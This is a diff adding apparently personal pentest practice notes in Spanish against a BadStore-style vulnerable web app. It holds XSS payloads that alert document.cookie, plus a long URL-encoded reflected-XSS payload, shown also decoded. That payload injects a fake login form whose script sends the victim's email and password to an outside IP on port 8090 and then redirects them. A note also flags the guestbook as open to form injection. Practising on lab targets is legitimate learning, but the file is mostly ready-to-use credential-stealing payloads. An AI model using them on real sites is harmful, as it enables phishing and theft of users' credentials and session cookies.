@@ -1,0 +1,57 @@
+[*] https://www.bladstore.net/cgi-bin/badstore.cgi?action=loginregister -> <img src="" onerror=alert(document.cookie) /> (en el campo email)
+
+=========================================================================================================================================================
+
+http://www.bladstore.net/cgi-bin/badstore.cgi?action=search&searchquery=ZAP?name=abc#<img src="random.gif" onerror=alert(5397)>
+
+
+--url con el formulario 
+https://www.bladstore.net/cgi-bin/badstore.cgi?action=search&searchquery=%3Cform%20action=%22http://200.200.100.10:8090%22%20method=%22GET%22%3E%3Cp%3EIntroduce%20tu%20email:%3Cinput%20type=%22email%22%20%20name=%22email%22%20placeholder=%22Introduce%20tu%20email%22%20/%3E%3C/p%3E%3Cp%3EIntroduce%20tu%20password:%20%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22introduce%20tu%20password%22/%3E%3C/p%3E%3Cinput%20type=%22submit%22%20value=%22enviar%20informacion%22/%3E%3Cscript%3Edocument.addEventListener(%22DOMContentLoaded%22,%20()%20=%3E%20{let%20formulario%20=%20document.querySelector(%22form%22)formulario.addEventListener(%22submit%22,%20async%20(e)%20=%3E%20{e.preventDefault();let%20email%20=%20document.querySelector(%22input[type=email]%22).value;let%20pass%20=%20document.querySelector(%22input[type=password]%22).value;await%20fetch(`http://200.200.100.10:8090?email=${email}&password=${pass}`,%20{method:%20%27GET%27});window.location.href=%22http://www.bladstore.net/%22});});%3C/script%3E%3C/form%3E
+
+<form action="http://200.200.100.10:8090" method="GET">
+    <p>
+        Introduce tu email:<input type="email"  name="email" placeholder="Introduce tu email" /> 
+    </p>
+    <p>
+        Introduce tu password: <input type="password" name="password" placeholder="introduce tu password"/>
+    </p>
+
+    <input type="submit" value="enviar informacion"/>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            let formulario = document.querySelector("form")
+            formulario.addEventListener("submit", async (e) => {
+                e.preventDefault();
+
+                let email = document.querySelector("input[type=email]").value;
+                let pass = document.querySelector("input[type=password]").value;
+
+                await fetch(`http://200.200.100.10:8090?email=${email}&password=${pass}`, {
+                    method: 'GET'
+                });
+
+                window.location.href="http://www.bladstore.net/"
+            });
+        });
+    </script>
+</form>
+
+=========================================================================================================================================================
+https://www.bladstore.net/cgi-bin/badstore.cgi?action=guestbook
+#este es vulnerable a modificar el formulario con cualquier tipo de contenido
+
+
+=========================================================================================================================================================
+
+
+=========================================================================================================================================================
+
+
+=========================================================================================================================================================
+
+
+=========================================================================================================================================================
+
+
+=========================================================================================================================================================
